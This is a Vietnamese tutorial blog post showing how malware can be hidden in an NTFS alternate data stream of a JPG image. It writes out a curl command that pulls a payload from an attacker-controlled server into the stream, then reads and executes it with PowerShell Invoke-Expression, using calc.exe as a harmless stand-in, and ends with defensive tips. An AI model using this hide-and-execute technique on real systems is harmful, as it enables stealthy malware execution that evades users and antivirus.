# Hacker ẩn Malware vào hình ảnh và thực thi như thế nào?

Thế giới kỹ thuật số ngày càng phát triển mạnh mẽ, nguy cơ từ các hacker và Virus luôn là mối quan tâm hàng đầu của người dùng Internet. Các tấn công mạng ngày càng tinh vi và phức tạp, và một trong những phương pháp đáng sợ nhất mà hacker đang sử dụng là thực thi mã độc thông qua hình ảnh. Có thể bạn đã nghe nói về việc đính kèm mã độc vào tệp tin hình ảnh và lây lan thông qua các trang web, email hay ứng dụng đúng không nhỉ? Vậy trong bài viết này, Anonyviet demo lại cách mà hacker thực thi Virus (phần mềm độc hại) bằng hình ảnh và tại sao phương pháp này có thể gây hậu quả nghiêm trọng cho việc bảo mật thông tin của chúng ta.

**Lưu ý: Bài viết chỉ dành cho mục đích giáo dục, nghiên cứu và học tập. Mọi hành vi liên quan đến pháp luật, Anonyviet sẽ không chịu trách nhiệm về mọi hành vi mà bạn gây ra!**

## Demo Hacker ẩn Virus vào hình ảnh và cách thực thi

Đầu tiên mình đã chuẩn bị sẵn một hình ảnh có tên là anonyviet.jpg, và một máy chủ Kali Linux để lưu trữ các mã độc. Bây giờ mình sử dụng lệnh curl để lấy để lấy "mã độc" có trong payload.txt. Trong payload.txt mình đã lưu trữ một dòng lệnh `calc.exe`. Đây là một câu lệnh đơn giản để mở Calculator trên hệ điều hành Windows.

Để nhúng calc.exe vào hình ảnh anonyviet.jpg mình đã thực hiện lệnh sau:

```
curl http://192.168.0.111:8000/payload.txt > anonyviet.jpg:payload
```

Câu lệnh trên sẽ thực hiện việc tải về nội dung từ URL "http://192.168.0.111:8000/payload.txt" và ghi nội dung đó vào tệp tin "anonyviet.jpg:payload"

Sau lệnh curl thực thi xong, chúng ta có thể thấy dung lượng hình ảnh không thay đổi nhưng khi bạn nhập lệnh `dir /r` thì các bạn có thể thấy 1 dữ liệu khác có tên là `anonyviet.jpg:payload:$DATA`

Mặc dù các bạn đã biết trong `anonyviet.jpg:payload:$DATA` có chứa dữ liệu "calc.exe", nhưng trong trường hợp khác. Giả sử nếu bạn thực thi 1 file virus.exe, con virus này nó thực thi câu lệnh curl giống như trên. Vậy làm sao để biết được mã độc dấu trong hình ảnh. Và đây là cách mình kiểm tra với lệnh bên dưới:

```
powershell -c "Get-Content .\anonyviet.jpg -Stream payload"
```

Câu lệnh trên được sử dụng để truy xuất dữ liệu từ một luồng dữ liệu (stream) đặc biệt trong tệp tin "anonyviet.jpg". Để hiểu rõ hơn về lệnh này, mình sẽ giải thích từng phần cụ thể:

1. `powershell`: Đây là một chương trình dòng lệnh trong hệ điều hành Windows, cho phép thực thi các lệnh và tập lệnh (script) PowerShell.
2. `-c`: Đây là tùy chọn "command" trong PowerShell, cho phép bạn cung cấp một câu lệnh PowerShell trực tiếp từ dòng lệnh.
3. `"Get-Content .\anonyviet.jpg -Stream payload"`: Đây là câu lệnh PowerShell được trích dẫn trong dấu ngoặc kép. Nó sẽ được thực thi bởi PowerShell khi bạn chạy câu lệnh đó.
   - `Get-Content`: Là một cmdlet (lệnh) trong PowerShell được sử dụng để đọc nội dung của tệp tin.
   - `.\anonyviet.jpg`: Là đường dẫn tới tệp tin "anonyviet.jpg" trong thư mục hiện tại
   - `-Stream payload`: Đây là tham số "payload" của lệnh Get-Content. Trong PowerShell, "-Stream" cho phép bạn đọc dữ liệu từ các luồng dữ liệu đặc biệt của tệp tin. Trong trường hợp này, mình đang truy xuất dữ liệu từ luồng "payload" trong tệp tin "anonyviet.jpg"

Như vậy các bạn có thể thấy "calc.exe" đã được in ra màn hình. Vậy làm cách nào để thực thi "calc.exe", và đây là cách mình đã làm:

```
powershell -c "$opencalc = Get-Content .\anonyviet.jpg -Stream payload; Invoke-Expression $opencalc"
```

Mình đã gán một biến có tên `$opencalc` sau đó mình dùng lệnh `Invoke-Expression $opencalc`. Đây là câu lệnh PowerShell sử dụng cmdlet "Invoke-Expression" để thực thi dữ liệu được lưu trữ trong biến `$opencalc` như một câu lệnh PowerShell. Tức là nội dung đọc từ luồng "payload" trong tệp tin "anonyviet.jpg" sẽ được thực thi như một mã lệnh PowerShell

Như vậy các bạn có thể thấy "calc.exe" đã được thực thi thông qua hình ảnh. Và để thực tế hơn nữa, mình sẽ demo lại thực thi mã độc bằng hình ảnh + Bypass Antivirus.

## Dưới đây là một số cách phòng chống Hacker ẩn Virus vào hình ảnh:

1. **Giới hạn quyền truy cập vào PowerShell:** Đảm bảo rằng người dùng cuối không có quyền truy cập vào PowerShell hoặc giới hạn quyền sử dụng PowerShell cho các người dùng chỉ cần sử dụng nó trong mục đích công việc cụ thể

2. **Kiểm tra và cập nhật hệ thống:** Đảm bảo hệ điều hành và phần mềm trên máy tính luôn được cập nhật bản vá bảo mật mới nhất. Các bản vá này giúp bảo vệ khỏi các lỗ hổng bảo mật mà hacker có thể tận dụng

3. **Chỉ cài đặt phần mềm đáng tin cậy:** Đảm bảo rằng chỉ cài đặt và sử dụng các ứng dụng và phần mềm đáng tin cậy từ các nguồn có nguồn gốc xác thực. Tránh tải xuống và chạy các phần mềm từ nguồn không rõ nguồn gốc

4. **Sử dụng phần mềm chống mã độc:** Cài đặt và duy trì một phần mềm diệt virus và phần mềm chống Virus hiệu quả để ngăn chặn các cuộc tấn công từ mã độc và phần mềm độc hại

5. **Quản lý tường lửa và quyền hạn:** Thiết lập tường lửa để kiểm soát các kết nối đến và ra khỏi hệ thống và hạn chế quyền hạn của người dùng, đặc biệt là đối với các tài khoản quản trị viên

6. **Kiểm tra dữ liệu đầu vào:** Trong ứng dụng của bạn, hãy kiểm tra và xác thực dữ liệu đầu vào của người dùng để tránh các cuộc tấn công thông qua các kỹ thuật nhập liệu không an toàn

7. **Tạo sao lưu định kỳ:** Đảm bảo sao lưu dữ liệu thường xuyên và lưu trữ nó ở một nơi an toàn để đảm bảo rằng bạn có khả năng khôi phục lại dữ liệu trong trường hợp bị Virus tấn công

8. **Đào tạo người dùng:** Tăng cường khả năng nhận diện các cuộc tấn công từ Virus và tư duy bảo mật cho người dùng của bạn để họ hiểu và phòng chống các mối nguy hiểm tiềm tàng

9. **Kiểm tra các tệp tin hình ảnh và luồng dữ liệu:** Sử dụng phần mềm chống mã độc để quét các tệp hình ảnh và các luồng dữ liệu trong các tệp tin để phát hiện và ngăn chặn các mã độc có thể ẩn trong hình ảnh

Như vậy mình đã demo lại cách mà hacker thực thi Virus thông qua hình ảnh. Mình thấy đây là một thủ thuật tinh vi và nguy hiểm có khả năng phát tán mã độc rất cao. Chúng ta đã khám phá cách mà hình ảnh có thể được sử dụng như một vũ khí trong tay của hacker để xâm nhập vào hệ thống và lây nhiễm các phần mềm độc hại vào máy tính của chúng ta. Từ việc giấu Virus vào hình ảnh cho đến việc thực thi Virus thông qua các luồng dữ liệu, các chiến thuật này đòi hỏi chúng ta phải tăng cường nhận thức và thực hiện các biện pháp phòng ngừa mạnh mẽ. Việc bảo mật thông tin và dữ liệu trong thời đại công nghệ số là một thách thức không hề nhỏ. Để bảo vệ bản thân trước những cuộc tấn công Virus thông qua hình ảnh, chúng ta cần kết hợp sự cảnh giác, kiến thức về các chiến thuật tấn công, và việc sử dụng các công cụ bảo mật đáng tin cậy. Việc duy trì hệ thống và phần mềm cập nhật thường xuyên, cùng việc hạn chế quyền truy cập và giám sát hoạt động mạng cũng là những yếu tố quan trọng để đảm bảo an toàn.

---

*Nguồn: AnonyViet*
*Tags: ẩn virus vào hình ảnh, mã độc, malware, virus*